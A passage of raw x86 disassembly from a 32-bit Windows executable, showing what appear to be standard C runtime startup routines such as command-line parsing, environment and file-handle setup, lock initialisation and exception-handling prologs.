  424d02:	cmp    BYTE PTR [ecx],0x22
  424d05:	jne    0x424d0b
  424d07:	mov    eax,ecx
  424d09:	jmp    0x424d0d
  424d0b:	xor    ebx,ebx
  424d0d:	xor    ecx,ecx
  424d0f:	cmp    DWORD PTR [ebp-0x4],ecx
  424d12:	sete   cl
  424d15:	mov    DWORD PTR [ebp-0x4],ecx
  424d18:	shr    edx,1
  424d1a:	test   edx,edx
  424d1c:	je     0x424d2b
  424d1e:	test   edi,edi
  424d20:	je     0x424d26
  424d22:	mov    BYTE PTR [edi],0x5c
  424d25:	inc    edi
  424d26:	inc    DWORD PTR [esi]
  424d28:	dec    edx
  424d29:	jne    0x424d1e
  424d2b:	mov    cl,BYTE PTR [eax]
  424d2d:	test   cl,cl
  424d2f:	je     0x424d79
  424d31:	cmp    DWORD PTR [ebp-0x4],0x0
  424d35:	jne    0x424d41
  424d37:	cmp    cl,0x20
  424d3a:	je     0x424d79
  424d3c:	cmp    cl,0x9
  424d3f:	je     0x424d79
  424d41:	test   ebx,ebx
  424d43:	je     0x424d73
  424d45:	test   edi,edi
  424d47:	je     0x424d62
  424d49:	movzx  edx,cl
  424d4c:	test   BYTE PTR [edx+0x45df21],0x4
  424d53:	je     0x424d5b
  424d55:	mov    BYTE PTR [edi],cl
  424d57:	inc    edi
  424d58:	inc    eax
  424d59:	inc    DWORD PTR [esi]
  424d5b:	mov    cl,BYTE PTR [eax]
  424d5d:	mov    BYTE PTR [edi],cl
  424d5f:	inc    edi
  424d60:	jmp    0x424d71
  424d62:	movzx  ecx,cl
  424d65:	test   BYTE PTR [ecx+0x45df21],0x4
  424d6c:	je     0x424d71
  424d6e:	inc    eax
  424d6f:	inc    DWORD PTR [esi]
  424d71:	inc    DWORD PTR [esi]
  424d73:	inc    eax
  424d74:	jmp    0x424ce1
  424d79:	test   edi,edi
  424d7b:	je     0x424d81
  424d7d:	and    BYTE PTR [edi],0x0
  424d80:	inc    edi
  424d81:	inc    DWORD PTR [esi]
  424d83:	mov    ebx,DWORD PTR [ebp+0xc]
  424d86:	jmp    0x424cac
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	test   eax,eax
  424d90:	je     0x424d95
  424d92:	and    DWORD PTR [eax],0x0
  424d95:	inc    DWORD PTR [ebx]
  424d97:	pop    edi
  424d98:	pop    ebx
  424d99:	leave  
  424d9a:	ret    
  424d9b:	push   ebp
  424d9c:	mov    ebp,esp
  424d9e:	push   ecx
  424d9f:	push   ecx
  424da0:	push   ebx
  424da1:	push   esi
  424da2:	push   edi
  424da3:	xor    edi,edi
  424da5:	cmp    DWORD PTR ds:0x45e26c,edi
  424dab:	jne    0x424db2
  424dad:	call   0x425f3c
  424db2:	and    BYTE PTR ds:0x45dc14,0x0
  424db9:	push   0x104
  424dbe:	mov    esi,0x45db10
  424dc3:	push   esi
  424dc4:	push   edi
  424dc5:	call   DWORD PTR ds:0x42906c
  424dcb:	mov    eax,ds:0x45e274
  424dd0:	cmp    eax,edi
  424dd2:	mov    DWORD PTR ds:0x45daf4,esi
  424dd8:	je     0x424de1
  424dda:	cmp    BYTE PTR [eax],0x0
  424ddd:	mov    ebx,eax
  424ddf:	jne    0x424de3
  424de1:	mov    ebx,esi
  424de3:	lea    eax,[ebp-0x4]
  424de6:	push   eax
  424de7:	push   edi
  424de8:	lea    esi,[ebp-0x8]
  424deb:	xor    ecx,ecx
  424ded:	mov    eax,ebx
  424def:	call   0x424c2f
  424df4:	mov    esi,DWORD PTR [ebp-0x4]
  424df7:	mov    eax,DWORD PTR [ebp-0x8]
  424dfa:	shl    esi,0x2
  424dfd:	add    eax,esi
  424dff:	push   eax
  424e00:	call   0x426072
  424e05:	mov    edi,eax
  424e07:	add    esp,0xc
  424e0a:	test   edi,edi
  424e0c:	jne    0x424e13
  424e0e:	or     eax,0xffffffff
  424e11:	jmp    0x424e38
  424e13:	lea    eax,[ebp-0x4]
  424e16:	push   eax
  424e17:	lea    ecx,[esi+edi*1]
  424e1a:	push   edi
  424e1b:	lea    esi,[ebp-0x8]
  424e1e:	mov    eax,ebx
  424e20:	call   0x424c2f
  424e25:	mov    eax,DWORD PTR [ebp-0x4]
  424e28:	dec    eax
  424e29:	pop    ecx
  424e2a:	mov    ds:0x45dad8,eax
  424e2f:	pop    ecx
  424e30:	mov    DWORD PTR ds:0x45dadc,edi
  424e36:	xor    eax,eax
  424e38:	pop    edi
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	leave  
  424e3c:	ret    
  424e3d:	push   ecx
  424e3e:	push   ecx
  424e3f:	mov    eax,ds:0x45dc18
  424e44:	push   ebx
  424e45:	push   ebp
  424e46:	push   esi
  424e47:	push   edi
  424e48:	mov    edi,DWORD PTR ds:0x429084
  424e4e:	xor    ebx,ebx
  424e50:	xor    esi,esi
  424e52:	cmp    eax,ebx
  424e54:	push   0x2
  424e56:	pop    ebp
  424e57:	jne    0x424e86
  424e59:	call   edi
  424e5b:	mov    esi,eax
  424e5d:	cmp    esi,ebx
  424e5f:	je     0x424e6d
  424e61:	mov    DWORD PTR ds:0x45dc18,0x1
  424e6b:	jmp    0x424e8b
  424e6d:	call   DWORD PTR ds:0x429028
  424e73:	cmp    eax,0x78
  424e76:	jne    0x424e81
  424e78:	mov    eax,ebp
  424e7a:	mov    ds:0x45dc18,eax
  424e7f:	jmp    0x424e86
  424e81:	mov    eax,ds:0x45dc18
  424e86:	cmp    eax,0x1
  424e89:	jne    0x424f08
  424e8b:	cmp    esi,ebx
  424e8d:	jne    0x424e97
  424e8f:	call   edi
  424e91:	mov    esi,eax
  424e93:	cmp    esi,ebx
  424e95:	je     0x424f10
  424e97:	cmp    WORD PTR [esi],bx
  424e9a:	mov    eax,esi
  424e9c:	je     0x424eac
  424e9e:	add    eax,ebp
  424ea0:	cmp    WORD PTR [eax],bx
  424ea3:	jne    0x424e9e
  424ea5:	add    eax,ebp
  424ea7:	cmp    WORD PTR [eax],bx
  424eaa:	jne    0x424e9e
  424eac:	mov    edi,DWORD PTR ds:0x429080
  424eb2:	push   ebx
  424eb3:	push   ebx
  424eb4:	push   ebx
  424eb5:	sub    eax,esi
  424eb7:	push   ebx
  424eb8:	sar    eax,1
  424eba:	inc    eax
  424ebb:	push   eax
  424ebc:	push   esi
  424ebd:	push   ebx
  424ebe:	push   ebx
  424ebf:	mov    DWORD PTR [esp+0x34],eax
  424ec3:	call   edi
  424ec5:	mov    ebp,eax
  424ec7:	cmp    ebp,ebx
  424ec9:	je     0x424efd
  424ecb:	push   ebp
  424ecc:	call   0x426072
  424ed1:	cmp    eax,ebx
  424ed3:	pop    ecx
  424ed4:	mov    DWORD PTR [esp+0x10],eax
  424ed8:	je     0x424efd
  424eda:	push   ebx
  424edb:	push   ebx
  424edc:	push   ebp
  424edd:	push   eax
  424ede:	push   DWORD PTR [esp+0x24]
  424ee2:	push   esi
  424ee3:	push   ebx
  424ee4:	push   ebx
  424ee5:	call   edi
  424ee7:	test   eax,eax
  424ee9:	jne    0x424ef9
  424eeb:	push   DWORD PTR [esp+0x10]
  424eef:	call   0x425f5a
  424ef4:	pop    ecx
  424ef5:	mov    DWORD PTR [esp+0x10],ebx
  424ef9:	mov    ebx,DWORD PTR [esp+0x10]
  424efd:	push   esi
  424efe:	call   DWORD PTR ds:0x42907c
  424f04:	mov    eax,ebx
  424f06:	jmp    0x424f58
  424f08:	cmp    eax,ebp
  424f0a:	je     0x424f14
  424f0c:	cmp    eax,ebx
  424f0e:	je     0x424f14
  424f10:	xor    eax,eax
  424f12:	jmp    0x424f58
  424f14:	call   DWORD PTR ds:0x429078
  424f1a:	mov    esi,eax
  424f1c:	cmp    esi,ebx
  424f1e:	je     0x424f10
  424f20:	cmp    BYTE PTR [esi],bl
  424f22:	je     0x424f2e
  424f24:	inc    eax
  424f25:	cmp    BYTE PTR [eax],bl
  424f27:	jne    0x424f24
  424f29:	inc    eax
  424f2a:	cmp    BYTE PTR [eax],bl
  424f2c:	jne    0x424f24
  424f2e:	sub    eax,esi
  424f30:	inc    eax
  424f31:	mov    ebp,eax
  424f33:	push   ebp
  424f34:	call   0x426072
  424f39:	mov    edi,eax
  424f3b:	cmp    edi,ebx
  424f3d:	pop    ecx
  424f3e:	jne    0x424f44
  424f40:	xor    edi,edi
  424f42:	jmp    0x424f4f
  424f44:	push   ebp
  424f45:	push   esi
  424f46:	push   edi
  424f47:	call   0x426090
  424f4c:	add    esp,0xc
  424f4f:	push   esi
  424f50:	call   DWORD PTR ds:0x429074
  424f56:	mov    eax,edi
  424f58:	pop    edi
  424f59:	pop    esi
  424f5a:	pop    ebp
  424f5b:	pop    ebx
  424f5c:	pop    ecx
  424f5d:	pop    ecx
  424f5e:	ret    
  424f5f:	sub    esp,0x48
  424f62:	push   ebx
  424f63:	mov    ebx,0x480
  424f68:	push   ebx
  424f69:	call   0x426072
  424f6e:	test   eax,eax
  424f70:	pop    ecx
  424f71:	jne    0x424f7b
  424f73:	or     eax,0xffffffff
  424f76:	jmp    0x425158
  424f7b:	mov    ds:0x45e160,eax
  424f80:	mov    DWORD PTR ds:0x45e148,0x20
  424f8a:	lea    ecx,[eax+0x480]
  424f90:	jmp    0x424fb0
  424f92:	and    BYTE PTR [eax+0x4],0x0
  424f96:	or     DWORD PTR [eax],0xffffffff
  424f99:	and    DWORD PTR [eax+0x8],0x0
  424f9d:	mov    BYTE PTR [eax+0x5],0xa
  424fa1:	mov    ecx,DWORD PTR ds:0x45e160
  424fa7:	add    eax,0x24
  424faa:	add    ecx,0x480
  424fb0:	cmp    eax,ecx
  424fb2:	jb     0x424f92
  424fb4:	push   ebp
  424fb5:	push   esi
  424fb6:	push   edi
  424fb7:	lea    eax,[esp+0x14]
  424fbb:	push   eax
  424fbc:	call   DWORD PTR ds:0x429050
  424fc2:	cmp    WORD PTR [esp+0x46],0x0
  424fc8:	je     0x4250b7
  424fce:	mov    eax,DWORD PTR [esp+0x48]
  424fd2:	test   eax,eax
  424fd4:	je     0x4250b7
  424fda:	mov    edi,DWORD PTR [eax]
  424fdc:	lea    ebp,[eax+0x4]
  424fdf:	lea    eax,[edi+ebp*1]
  424fe2:	mov    DWORD PTR [esp+0x10],eax
  424fe6:	mov    eax,0x800
  424feb:	cmp    edi,eax
  424fed:	jl     0x424ff1
  424fef:	mov    edi,eax
  424ff1:	cmp    DWORD PTR ds:0x45e148,edi
  424ff7:	jge    0x425047
  424ff9:	mov    esi,0x45e164
  424ffe:	push   ebx
  424fff:	call   0x426072
  425004:	test   eax,eax
  425006:	pop    ecx
  425007:	je     0x425041
  425009:	add    DWORD PTR ds:0x45e148,0x20
  425010:	mov    DWORD PTR [esi],eax
  425012:	lea    ecx,[eax+0x480]
  425018:	jmp    0x425030
  42501a:	and    BYTE PTR [eax+0x4],0x0
  42501e:	or     DWORD PTR [eax],0xffffffff
  425021:	and    DWORD PTR [eax+0x8],0x0
  425025:	mov    BYTE PTR [eax+0x5],0xa
  425029:	mov    ecx,DWORD PTR [esi]
  42502b:	add    eax,0x24
  42502e:	add    ecx,ebx
  425030:	cmp    eax,ecx
  425032:	jb     0x42501a
  425034:	add    esi,0x4
  425037:	cmp    DWORD PTR ds:0x45e148,edi
  42503d:	jl     0x424ffe
  42503f:	jmp    0x425047
  425041:	mov    edi,DWORD PTR ds:0x45e148
  425047:	xor    ebx,ebx
  425049:	test   edi,edi
  42504b:	jle    0x4250b7
  42504d:	mov    eax,DWORD PTR [esp+0x10]
  425051:	mov    eax,DWORD PTR [eax]
  425053:	cmp    eax,0xffffffff
  425056:	je     0x4250ac
  425058:	mov    cl,BYTE PTR [ebp+0x0]
  42505b:	test   cl,0x1
  42505e:	je     0x4250ac
  425060:	test   cl,0x8
  425063:	jne    0x425070
  425065:	push   eax
  425066:	call   DWORD PTR ds:0x42908c
  42506c:	test   eax,eax
  42506e:	je     0x4250ac
  425070:	mov    ecx,ebx
  425072:	mov    eax,ebx
  425074:	and    eax,0x1f
  425077:	lea    eax,[eax+eax*8]
  42507a:	sar    ecx,0x5
  42507d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425084:	lea    esi,[ecx+eax*4]
  425087:	mov    eax,DWORD PTR [esp+0x10]
  42508b:	mov    eax,DWORD PTR [eax]
  42508d:	mov    DWORD PTR [esi],eax
  42508f:	mov    al,BYTE PTR [ebp+0x0]
  425092:	mov    BYTE PTR [esi+0x4],al
  425095:	lea    eax,[esi+0xc]
  425098:	push   0xfa0
  42509d:	push   eax
  42509e:	call   0x4263dd
  4250a3:	test   eax,eax
  4250a5:	pop    ecx
  4250a6:	pop    ecx
  4250a7:	je     0x4250d7
  4250a9:	inc    DWORD PTR [esi+0x8]
  4250ac:	add    DWORD PTR [esp+0x10],0x4
  4250b1:	inc    ebx
  4250b2:	inc    ebp
  4250b3:	cmp    ebx,edi
  4250b5:	jl     0x42504d
  4250b7:	xor    ebx,ebx
  4250b9:	mov    ecx,DWORD PTR ds:0x45e160
  4250bf:	lea    eax,[ebx+ebx*8]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	cmp    DWORD PTR [esi],0xffffffff
  4250c8:	jne    0x425139
  4250ca:	test   ebx,ebx
  4250cc:	mov    BYTE PTR [esi+0x4],0x81
  4250d0:	jne    0x4250dc
  4250d2:	push   0xfffffff6
  4250d4:	pop    eax
  4250d5:	jmp    0x4250e6
  4250d7:	or     eax,0xffffffff
  4250da:	jmp    0x425155
  4250dc:	mov    eax,ebx
  4250de:	dec    eax
  4250df:	neg    eax
  4250e1:	sbb    eax,eax
  4250e3:	add    eax,0xfffffff5
  4250e6:	push   eax
  4250e7:	call   DWORD PTR ds:0x429068
  4250ed:	mov    edi,eax
  4250ef:	cmp    edi,0xffffffff
  4250f2:	je     0x425133
  4250f4:	push   edi
  4250f5:	call   DWORD PTR ds:0x42908c
  4250fb:	test   eax,eax
  4250fd:	je     0x425133
  4250ff:	and    eax,0xff
  425104:	cmp    eax,0x2
  425107:	mov    DWORD PTR [esi],edi
  425109:	jne    0x425111
  42510b:	or     BYTE PTR [esi+0x4],0x40
  42510f:	jmp    0x42511a
  425111:	cmp    eax,0x3
  425114:	jne    0x42511a
  425116:	or     BYTE PTR [esi+0x4],0x8
  42511a:	lea    eax,[esi+0xc]
  42511d:	push   0xfa0
  425122:	push   eax
  425123:	call   0x4263dd
  425128:	test   eax,eax
  42512a:	pop    ecx
  42512b:	pop    ecx
  42512c:	je     0x4250d7
  42512e:	inc    DWORD PTR [esi+0x8]
  425131:	jmp    0x42513d
  425133:	or     BYTE PTR [esi+0x4],0x40
  425137:	jmp    0x42513d
  425139:	or     BYTE PTR [esi+0x4],0x80
  42513d:	inc    ebx
  42513e:	cmp    ebx,0x3
  425141:	jl     0x4250b9
  425147:	push   DWORD PTR ds:0x45e148
  42514d:	call   DWORD PTR ds:0x429088
  425153:	xor    eax,eax
  425155:	pop    edi
  425156:	pop    esi
  425157:	pop    ebp
  425158:	pop    ebx
  425159:	add    esp,0x48
  42515c:	ret    
  42515d:	push   0xc
  42515f:	push   0x4295b8
  425164:	call   0x425350
  425169:	mov    DWORD PTR [ebp-0x1c],0x42a010
  425170:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  425177:	jae    0x42519b
  425179:	and    DWORD PTR [ebp-0x4],0x0
  42517d:	mov    eax,DWORD PTR [ebp-0x1c]
  425180:	mov    eax,DWORD PTR [eax]
  425182:	test   eax,eax
  425184:	je     0x425191
  425186:	call   eax
  425188:	jmp    0x425191
  42518a:	xor    eax,eax
  42518c:	inc    eax
  42518d:	ret    
  42518e:	mov    esp,DWORD PTR [ebp-0x18]
  425191:	or     DWORD PTR [ebp-0x4],0xffffffff
  425195:	add    DWORD PTR [ebp-0x1c],0x4
  425199:	jmp    0x425170
  42519b:	call   0x42538b
  4251a0:	ret    
  4251a1:	push   0xc
  4251a3:	push   0x4295c8
  4251a8:	call   0x425350
  4251ad:	mov    DWORD PTR [ebp-0x1c],0x42a018
  4251b4:	cmp    DWORD PTR [ebp-0x1c],0x42a018
  4251bb:	jae    0x4251df
  4251bd:	and    DWORD PTR [ebp-0x4],0x0
  4251c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251c4:	mov    eax,DWORD PTR [eax]
  4251c6:	test   eax,eax
  4251c8:	je     0x4251d5
  4251ca:	call   eax
  4251cc:	jmp    0x4251d5
  4251ce:	xor    eax,eax
  4251d0:	inc    eax
  4251d1:	ret    
  4251d2:	mov    esp,DWORD PTR [ebp-0x18]
  4251d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251d9:	add    DWORD PTR [ebp-0x1c],0x4
  4251dd:	jmp    0x4251b4
  4251df:	call   0x42538b
  4251e4:	ret    
  4251e5:	call   0x425426
  4251ea:	mov    eax,ds:0x45d304
  4251ef:	cmp    eax,0xffffffff
  4251f2:	je     0x425202
  4251f4:	push   eax
  4251f5:	call   DWORD PTR ds:0x429094
  4251fb:	or     DWORD PTR ds:0x45d304,0xffffffff
  425202:	ret    
  425203:	push   ebx
  425204:	push   esi
  425205:	call   DWORD PTR ds:0x429028
  42520b:	push   DWORD PTR ds:0x45d304
  425211:	mov    ebx,eax
  425213:	call   DWORD PTR ds:0x4290a4
  425219:	mov    esi,eax
  42521b:	test   esi,esi
  42521d:	jne    0x425268
  42521f:	push   0x88
  425224:	push   0x1
  425226:	call   0x426468
  42522b:	mov    esi,eax
  42522d:	test   esi,esi
  42522f:	pop    ecx
  425230:	pop    ecx
  425231:	je     0x425260
  425233:	push   esi
  425234:	push   DWORD PTR ds:0x45d304
  42523a:	call   DWORD PTR ds:0x4290a0
  425240:	test   eax,eax
  425242:	je     0x425260
  425244:	mov    DWORD PTR [esi+0x54],0x45d258
  42524b:	mov    DWORD PTR [esi+0x14],0x1
  425252:	call   DWORD PTR ds:0x42909c
  425258:	or     DWORD PTR [esi+0x4],0xffffffff
  42525c:	mov    DWORD PTR [esi],eax
  42525e:	jmp    0x425268
  425260:	push   0x10
  425262:	call   0x424416
  425267:	pop    ecx
  425268:	push   ebx
  425269:	call   DWORD PTR ds:0x429098
  42526f:	mov    eax,esi
  425271:	pop    esi
  425272:	pop    ebx
  425273:	ret    
  425274:	call   0x4253dd
  425279:	test   eax,eax
  42527b:	je     0x42528d
  42527d:	call   DWORD PTR ds:0x4290a8
  425283:	cmp    eax,0xffffffff
  425286:	mov    ds:0x45d304,eax
  42528b:	jne    0x425295
  42528d:	call   0x4251e5
  425292:	xor    eax,eax
  425294:	ret    
  425295:	push   esi
  425296:	push   0x88
  42529b:	push   0x1
  42529d:	call   0x426468
  4252a2:	mov    esi,eax
  4252a4:	test   esi,esi
  4252a6:	pop    ecx
  4252a7:	pop    ecx
  4252a8:	je     0x4252da
  4252aa:	push   esi
  4252ab:	push   DWORD PTR ds:0x45d304
  4252b1:	call   DWORD PTR ds:0x4290a0
  4252b7:	test   eax,eax
  4252b9:	je     0x4252da
  4252bb:	mov    DWORD PTR [esi+0x54],0x45d258
  4252c2:	mov    DWORD PTR [esi+0x14],0x1
  4252c9:	call   DWORD PTR ds:0x42909c
  4252cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252d3:	mov    DWORD PTR [esi],eax
  4252d5:	xor    eax,eax
  4252d7:	inc    eax
  4252d8:	pop    esi
  4252d9:	ret    
  4252da:	call   0x4251e5
  4252df:	xor    eax,eax
  4252e1:	pop    esi
  4252e2:	ret    
  4252e3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252ea:	jne    0x4252f9
  4252ec:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252f3:	jb     0x4252f9
  4252f5:	xor    eax,eax
  4252f7:	inc    eax
  4252f8:	ret    
  4252f9:	push   0x3
  4252fb:	pop    eax
  4252fc:	ret    
  4252fd:	xor    eax,eax
  4252ff:	cmp    DWORD PTR [esp+0x4],eax
  425303:	push   0x0
  425305:	sete   al
  425308:	push   0x1000
  42530d:	push   eax
  42530e:	call   DWORD PTR ds:0x429034
  425314:	test   eax,eax
  425316:	mov    ds:0x45e140,eax
  42531b:	je     0x425347
  42531d:	call   0x4252e3
  425322:	cmp    eax,0x3
  425325:	mov    ds:0x45e144,eax
  42532a:	jne    0x42534a
  42532c:	push   0x3f8
  425331:	call   0x4266ea
  425336:	test   eax,eax
  425338:	pop    ecx
  425339:	jne    0x42534a
  42533b:	push   DWORD PTR ds:0x45e140
  425341:	call   DWORD PTR ds:0x4290ac
  425347:	xor    eax,eax
  425349:	ret    
  42534a:	xor    eax,eax
  42534c:	inc    eax
  42534d:	ret    
  42534e:	int3   
  42534f:	int3   
  425350:	push   0x427218
  425355:	mov    eax,fs:0x0
  42535b:	push   eax
  42535c:	mov    eax,DWORD PTR [esp+0x10]
  425360:	mov    DWORD PTR [esp+0x10],ebp
  425364:	lea    ebp,[esp+0x10]
  425368:	sub    esp,eax
  42536a:	push   ebx
  42536b:	push   esi
  42536c:	push   edi
  42536d:	mov    eax,DWORD PTR [ebp-0x8]
  425370:	mov    DWORD PTR [ebp-0x18],esp
  425373:	push   eax
  425374:	mov    eax,DWORD PTR [ebp-0x4]
  425377:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42537e:	mov    DWORD PTR [ebp-0x8],eax
  425381:	lea    eax,[ebp-0x10]
  425384:	mov    fs:0x0,eax
  42538a:	ret    
  42538b:	mov    ecx,DWORD PTR [ebp-0x10]
  42538e:	mov    DWORD PTR fs:0x0,ecx
  425395:	pop    ecx
  425396:	pop    edi
  425397:	pop    esi
  425398:	pop    ebx
  425399:	leave  
  42539a:	push   ecx
  42539b:	ret    
  42539c:	int3   
  42539d:	int3   
  42539e:	int3   
  42539f:	int3   
  4253a0:	cmp    eax,0x1000
  4253a5:	jae    0x4253b5
  4253a7:	neg    eax
  4253a9:	add    eax,esp
  4253ab:	add    eax,0x4
  4253ae:	test   DWORD PTR [eax],eax
  4253b0:	xchg   esp,eax
  4253b1:	mov    eax,DWORD PTR [eax]
  4253b3:	push   eax
  4253b4:	ret    
  4253b5:	push   ecx
  4253b6:	lea    ecx,[esp+0x8]
  4253ba:	sub    ecx,0x1000
  4253c0:	sub    eax,0x1000
  4253c5:	test   DWORD PTR [ecx],eax
  4253c7:	cmp    eax,0x1000
  4253cc:	jae    0x4253ba
  4253ce:	sub    ecx,eax
  4253d0:	mov    eax,esp
  4253d2:	test   DWORD PTR [ecx],eax
  4253d4:	mov    esp,ecx
  4253d6:	mov    ecx,DWORD PTR [eax]
  4253d8:	mov    eax,DWORD PTR [eax+0x4]
  4253db:	push   eax
  4253dc:	ret    
  4253dd:	push   esi
  4253de:	push   edi
  4253df:	xor    esi,esi
  4253e1:	mov    edi,0x45dc20
  4253e6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253ee:	jne    0x42540e
  4253f0:	lea    eax,[esi*8+0x45d310]
  4253f7:	mov    DWORD PTR [eax],edi
  4253f9:	push   0xfa0
  4253fe:	push   DWORD PTR [eax]
  425400:	add    edi,0x18
  425403:	call   0x4263dd
  425408:	test   eax,eax
  42540a:	pop    ecx
  42540b:	pop    ecx
  42540c:	je     0x42541a
  42540e:	inc    esi
  42540f:	cmp    esi,0x24
  425412:	jl     0x4253e6
  425414:	xor    eax,eax
  425416:	inc    eax
  425417:	pop    edi
  425418:	pop    esi
  425419:	ret    
  42541a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425422:	xor    eax,eax
  425424:	jmp    0x425417
  425426:	push   ebx
  425427:	mov    ebx,DWORD PTR ds:0x429090
  42542d:	push   esi
  42542e:	mov    esi,0x45d310
  425433:	push   edi
  425434:	mov    edi,DWORD PTR [esi]
  425436:	test   edi,edi
  425438:	je     0x42544d
  42543a:	cmp    DWORD PTR [esi+0x4],0x1
  42543e:	je     0x42544d
  425440:	push   edi
  425441:	call   ebx
  425443:	push   edi
  425444:	call   0x425f5a
  425449:	and    DWORD PTR [esi],0x0
  42544c:	pop    ecx
  42544d:	add    esi,0x8
  425450:	cmp    esi,0x45d430
  425456:	jl     0x425434
  425458:	mov    esi,0x45d310
  42545d:	pop    edi
  42545e:	mov    eax,DWORD PTR [esi]
  425460:	test   eax,eax
  425462:	je     0x42546d
  425464:	cmp    DWORD PTR [esi+0x4],0x1
  425468:	jne    0x42546d
  42546a:	push   eax
  42546b:	call   ebx
  42546d:	add    esi,0x8
  425470:	cmp    esi,0x45d430
  425476:	jl     0x42545e
  425478:	pop    esi
  425479:	pop    ebx
  42547a:	ret    
  42547b:	push   ebp
  42547c:	mov    ebp,esp
  42547e:	mov    eax,DWORD PTR [ebp+0x8]
  425481:	push   DWORD PTR [eax*8+0x45d310]
  425488:	call   DWORD PTR ds:0x4290b4
  42548e:	pop    ebp
  42548f:	ret    
  425490:	push   ebp
  425491:	mov    ebp,esp
  425493:	push   esi
  425494:	mov    esi,DWORD PTR [ebp+0x8]
  425497:	lea    esi,[esi*8+0x45d310]
  42549e:	cmp    DWORD PTR [esi],0x0
  4254a1:	je     0x4254a8
  4254a3:	xor    eax,eax
  4254a5:	inc    eax
  4254a6:	jmp    0x42550c
  4254a8:	push   edi
  4254a9:	push   0x18
  4254ab:	call   0x426072
  4254b0:	mov    edi,eax
  4254b2:	test   edi,edi
  4254b4:	pop    ecx
  4254b5:	jne    0x4254c6
  4254b7:	call   0x4272f0
  4254bc:	mov    DWORD PTR [eax],0xc
  4254c2:	xor    eax,eax
  4254c4:	jmp    0x42550b
  4254c6:	push   0xa
  4254c8:	call   0x42550f
  4254cd:	cmp    DWORD PTR [esi],0x0
  4254d0:	pop    ecx
  4254d1:	jne    0x4254f9
  4254d3:	push   0xfa0
  4254d8:	push   edi
  4254d9:	call   0x4263dd
  4254de:	test   eax,eax
  4254e0:	pop    ecx
  4254e1:	pop    ecx
  4254e2:	jne    0x4254f5
  4254e4:	push   edi
  4254e5:	call   0x425f5a
  4254ea:	push   0xa
  4254ec:	call   0x42547b
  4254f1:	pop    ecx
  4254f2:	pop    ecx
  4254f3:	jmp    0x4254b7
  4254f5:	mov    DWORD PTR [esi],edi
  4254f7:	jmp    0x425500
  4254f9:	push   edi
  4254fa:	call   0x425f5a
  4254ff:	pop    ecx
  425500:	push   0xa
  425502:	call   0x42547b
  425507:	xor    eax,eax
  425509:	pop    ecx
  42550a:	inc    eax
  42550b:	pop    edi
  42550c:	pop    esi
  42550d:	pop    ebp
  42550e:	ret    
  42550f:	push   ebp
  425510:	mov    ebp,esp
  425512:	mov    eax,DWORD PTR [ebp+0x8]
  425515:	push   esi
  425516:	lea    esi,[eax*8+0x45d310]
  42551d:	cmp    DWORD PTR [esi],0x0
  425520:	jne    0x425535
  425522:	push   eax
  425523:	call   0x425490
  425528:	test   eax,eax
  42552a:	pop    ecx
  42552b:	jne    0x425535
  42552d:	push   0x11
  42552f:	call   0x424416
  425534:	pop    ecx
  425535:	push   DWORD PTR [esi]
  425537:	call   DWORD PTR ds:0x4290b8
  42553d:	pop    esi
  42553e:	pop    ebp
  42553f:	ret    
  425540:	push   esi
  425541:	push   DWORD PTR ds:0x45e268
  425547:	call   0x4274a6
  42554c:	pop    ecx
  42554d:	mov    ecx,DWORD PTR ds:0x45e264
  425553:	mov    esi,eax
  425555:	mov    eax,ds:0x45e268
  42555a:	mov    edx,ecx
  42555c:	sub    edx,eax
  42555e:	add    edx,0x4
  425561:	cmp    esi,edx
  425563:	jae    0x4255b3
  425565:	mov    ecx,0x800
  42556a:	cmp    esi,ecx
  42556c:	jae    0x425570
  42556e:	mov    ecx,esi
  425570:	add    ecx,esi
  425572:	push   ecx
  425573:	push   eax
  425574:	call   0x4272f9
  425579:	test   eax,eax
  42557b:	pop    ecx
  42557c:	pop    ecx
  42557d:	jne    0x425596
  42557f:	add    esi,0x10
  425582:	push   esi
  425583:	push   DWORD PTR ds:0x45e268
  425589:	call   0x4272f9
  42558e:	test   eax,eax
  425590:	pop    ecx
  425591:	pop    ecx
  425592:	jne    0x425596
  425594:	pop    esi
  425595:	ret    
  425596:	mov    ecx,DWORD PTR ds:0x45e264
  42559c:	sub    ecx,DWORD PTR ds:0x45e268
  4255a2:	mov    ds:0x45e268,eax
  4255a7:	sar    ecx,0x2
  4255aa:	lea    ecx,[eax+ecx*4]
  4255ad:	mov    DWORD PTR ds:0x45e264,ecx
  4255b3:	mov    DWORD PTR [ecx],edi
  4255b5:	add    DWORD PTR ds:0x45e264,0x4
  4255bc:	mov    eax,edi
  4255be:	pop    esi
  4255bf:	ret    
  4255c0:	push   0x80
  4255c5:	call   0x426072
  4255ca:	test   eax,eax
  4255cc:	pop    ecx
  4255cd:	mov    ds:0x45e268,eax
  4255d2:	jne    0x4255d8
  4255d4:	push   0x18
  4255d6:	pop    eax
  4255d7:	ret    
  4255d8:	and    DWORD PTR [eax],0x0
  4255db:	mov    eax,ds:0x45e268
  4255e0:	mov    ds:0x45e264,eax
  4255e5:	xor    eax,eax
  4255e7:	ret    
  4255e8:	push   0xc
  4255ea:	push   0x4295d8
  4255ef:	call   0x425350
  4255f4:	call   0x424661
  4255f9:	and    DWORD PTR [ebp-0x4],0x0
  4255fd:	mov    edi,DWORD PTR [ebp+0x8]
  425600:	call   0x425540
  425605:	mov    DWORD PTR [ebp-0x1c],eax
  425608:	or     DWORD PTR [ebp-0x4],0xffffffff
  42560c:	call   0x42561a
  425611:	mov    eax,DWORD PTR [ebp-0x1c]
  425614:	call   0x42538b
  425619:	ret    
  42561a:	call   0x42466a
  42561f:	ret    
  425620:	push   DWORD PTR [esp+0x4]
  425624:	call   0x4255e8
  425629:	neg    eax
  42562b:	sbb    eax,eax
  42562d:	neg    eax
  42562f:	pop    ecx
  425630:	dec    eax
  425631:	ret    
  425632:	push   ebp
  425633:	mov    ebp,esp
  425635:	sub    esp,0x10
  425638:	push   ebx
